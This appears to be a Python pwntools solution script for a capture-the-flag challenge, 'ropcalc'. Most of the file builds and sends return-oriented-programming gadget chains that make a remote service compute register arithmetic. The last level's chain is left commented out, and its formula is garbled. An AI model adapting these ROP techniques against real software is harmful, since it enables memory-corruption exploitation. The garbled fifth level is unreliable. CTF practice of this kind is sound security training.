#!/usr/bin/env python2

from pwn import *

local = True

if not local:
    r = remote('challs.campctf.ccc.ac', 10109)
else:
    r = remote('localhost', 1024)


elf = ELF('./ropcalc')

context.log_level = 'debug'


'''
level 1: Create a ROP chain that calculates: $rax + $rbx (store result in rax)

0x0000000000400b30 : add rax, rbx ; ret
'''

r.recvuntil('line:')
rop = ''
rop += p64(0x0000000000400b30)
r.sendline(rop.encode('hex'))


'''
level 2: Create a ROP chain that calculates: $rax + $rbx + 1337 (store result in rax)

0x0000000000400b30 : add rax, rbx ; ret
0x00000000004008d0 : pop rbx ; ret
1337
0x0000000000400b30 : add rax, rbx ; ret

'''

r.recvuntil('line:')
rop = ''
rop += p64(0x0000000000400b30)
rop += p64(0x00000000004008d0)
rop += p64(1337)
rop += p64(0x0000000000400b30)
r.sendline(rop.encode('hex'))


'''
level 3: Create a ROP chain that calculates: $rax * $rbx (store result in rax)

0x0000000000400b50 : imul rax, rbx ; ret
'''

r.recvuntil('line:')
rop = ''
rop += p64(0x0000000000400b50)
r.sendline(rop.encode('hex'))


'''
level 4: Create a ROP chain that calculates: $rax * (31337 + $rbx) (store result in rax)

0x0000000000400900 : pop rcx ; ret
31337
0x00000000004013a0 : add rcx, rbx ; ret
0x0000000000400ba0 : imul rax, rcx ; ret
'''

r.recvuntil('line:')
rop = ''
rop += p64(0x0000000000400900)
rop += p64(31337)
rop += p64(0x00000000004013a0)
rop += p64(0x0000000000400ba0)
r.sendline(rop.encode('hex'))


'''
level 5: Create a ROP chain that calculates:
    $rcx + 23 * $rax + $rbx - 42 * ($rcx - 5 * $rd$rax + $rbx + 1337 x - $rdi * $rsi) - $r8 + 2015 (store result in rax)



# 0x00000000004030a0 : mov r11, rcx ; ret     dup rcx
0x0000000000400a20 : pop r10 ; ret          stage 23
23
0x0000000000400d80 : imul rax, r10 ; ret    23 * rax
0x0000000000400b80 : add rax, rcx ; ret     ^this + rcx
0x0000000000400b30 : add rax, rbx ; ret     ^this + rbx


stuffs:
0x0000000000400a20 : pop r10 ; ret
5
0x00000000004019b0 : imul rdx, r10 ; ret
0x0000000000401400 : sub rcx, rdx ; ret


0x00000000004020e0 : imul rdi, rsi ; ret
0x00000000004014a0 : sub rcx, rdi ; ret


0x0000000000400a20 : pop r10 ; ret
42
0x00000000004015a0 : imul rcx, r10 ; ret


0x0000000000400b90 : sub rax, rcx ; ret
0x0000000000400cd0 : sub rax, r8 ; ret
0x0000000000400a20 : pop r10 ; ret
2015
0x0000000000400d60 : add rax, r10 ; ret




'''
'''
r.recvuntil('line:')
rop = ''
# rop += p64(0x00000000004030a0)
rop += p64(0x0000000000400a20)
rop += p64(23)
rop += p64(0x0000000000400d80)
rop += p64(0x0000000000400b80)
rop += p64(0x0000000000400b30)

rop += p64(0x0000000000400a20)
rop += p64(5)
rop += p64(0x00000000004019b0)
rop += p64(0x0000000000401400)

rop += p64(0x00000000004020e0)
rop += p64(0x00000000004014a0)

rop += p64(0x0000000000400a20)
rop += p64(42)
rop += p64(0x00000000004015a0)

rop += p64(0x0000000000400b90)
rop += p64(0x0000000000400cd0)
rop += p64(0x0000000000400a20)
rop += p64(2015)
rop += p64(0x0000000000400d60)
r.sendline(rop.encode('hex'))


r.interactive()
'''
